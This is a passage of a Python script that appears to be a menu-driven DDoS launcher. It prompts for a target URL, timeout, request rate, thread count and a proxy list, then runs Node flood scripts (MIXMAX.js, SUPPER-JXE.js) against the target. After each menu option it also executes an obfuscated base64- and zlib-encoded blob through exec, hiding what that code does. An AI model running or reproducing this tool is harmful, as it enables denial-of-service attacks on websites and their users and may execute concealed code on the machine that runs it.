─██░░██──────────██░░██─██░░░░░░██─██░░░░██──██░░░░██─██░░██──────────██░░██─██░░██──██░░██─██░░░░██──██░░░░██─
─██████──────────██████─██████████─████████──████████─██████──────────██████─██████──██████─████████──████████─
───────────────────────────────────────────────────────────────────────────────────────────────────────────────
          """+ Color.END)
    target = input(Color.GREEN + "URL : "+ Color.END)
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
    rate = int(input(Color.RED + "Rate : "+ Color.END))
    thread = int(input(Color.GREEN + "Thread : "+ Color.END))
    def run_js_file(file_path, target, timeout, rate, thread):
        try:
            result = subprocess.run(['node', file_path, target, str(timeout), str(rate), str(thread)], capture_output=True, text=True, check=True)
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print("Error:", e)
            print("Error Output:", e.stderr)

    js_file_path = "MIXMAX.js" #masukan file js
    run_js_file(js_file_path, target, timeout, rate, thread)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))
    
elif pilihan == "9":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    print(Color.YELLOW + """
████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░██████████████████████████░░░░░░█░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░██████████████████████████░░▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░██████████████████████████░░▄▀░░█░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀░░█████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░████░░▄▀░░██████████████████████████░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░█████████
█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███░░░░░░░░░░░░░░█████████░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█████████░░▄▀░░█████░░▄▀▄▀▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█
█░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███░░░░░░░░░░░░░░█░░░░░░██░░▄▀░░███░░░░▄▀▄▀▄▀░░░░███░░▄▀░░░░░░░░░░█
█████████░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░████████████████████░░▄▀░░██░░▄▀░░███░░▄▀▄▀░░▄▀▄▀░░███░░▄▀░░█████████
█░░░░░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░████████████████░░▄▀░░░░░░▄▀░░█░░░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░████████████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░█████████░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░████████████████░░░░░░░░░░░░░░█░░░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█
████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
          """+ Color.END)
    target = input(Color.CYAN + "URL : "+ Color.END)
    timeout = int(input(Color.BLUE + "Timeout : "+ Color.END))
    rate = int(input(Color.RED + "Rate : "+ Color.END))
    thread = int(input(Color.GREEN + "Thread : "+ Color.END))
    proxy = input(Color.CYAN + "ProxyList : "+ Color.END)
    def run_js_file(file_path, target, timeout, rate, thread, proxy):
        try:
            result = subprocess.run(['node', file_path, target, str(timeout), str(rate), str(thread), proxy], capture_output=True, text=True, check=True)
            print(result.stdout)
        except subprocess.CalledProcessError as e:
            print("Error:", e)
            print("Error Output:", e.stderr)

    js_file_path = "SUPPER-JXE.js" #masukan file js
    run_js_file(js_file_path, target, timeout, rate, thread, proxy)
    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrdMMIZ2NxZdrCDiQUQE15uItOmooWlakqxWxf/uhixeZnhv3rz5MOM8+UjDpAeM4tuaTnRtwFqJEP1ORxHNiOR18nShxlHfujeEquQbUkT/tY9FaHKzzAlW4oC391e3L9vHh+vLO550Uk/OoY4ArDpbyao+lZWsyjUTSq15knQe24EUuGicY/JOw2WwiDOccGKbvJPcubnVA7CLGyaC9Kg/QHH+VD6Tvjlgy8nnu7FILTro+bnd2/VH/9XjTHOCC2pIZ8se9TTOHkOA/AHZ1SqRPSal+GGBbcIvJ3/PBl75')[0])))

elif pilihan == "10":
    def loading_animation(duration):
        for _ in tqdm(range(duration), desc="DDOS LOADING :", ascii=True, ncols=100):
            time.sleep(1)
    loading_animation(1)
    exit()